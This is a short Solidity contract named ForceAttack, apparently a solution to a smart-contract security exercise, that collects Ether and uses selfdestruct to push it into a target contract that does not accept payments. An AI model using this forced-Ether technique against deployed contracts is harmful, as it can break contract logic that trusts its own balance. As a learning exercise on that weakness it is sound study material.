//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract ForceAttack is Owner {

    constructor () payable {

    }

    function deposit () external payable { }

    function sendEther (address _contract) external {
        selfdestruct(payable(_contract));
    }

}